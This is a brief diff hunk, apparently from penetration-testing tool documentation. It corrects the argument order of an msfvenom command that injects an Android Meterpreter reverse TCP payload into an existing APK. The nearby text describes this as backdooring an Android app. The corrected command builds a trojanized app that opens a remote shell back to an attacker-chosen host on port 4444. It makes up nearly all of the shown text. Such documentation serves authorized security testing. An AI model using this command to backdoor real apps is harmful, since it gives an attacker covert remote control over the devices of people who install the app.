@@ -53,7 +53,7 @@ screenshots of the Android app you are backdooring:
 
 
 ```
-./msfvenom -p -x com.existing.apk android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
+./msfvenom -p android/meterpreter/reverse_tcp -x com.existing.apk LHOST=[IP] LPORT=4444 -f raw -o /tmp/android.apk
 ```
 
 
